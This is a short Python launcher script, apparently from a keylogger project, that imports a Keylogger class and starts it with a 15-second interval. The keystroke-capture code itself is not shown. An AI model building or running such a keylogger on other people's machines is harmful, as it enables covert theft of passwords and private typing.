from src.keylogger import Keylogger


if __name__ == '__main__':
  keylogger = Keylogger(interval=15) 
  keylogger.start()
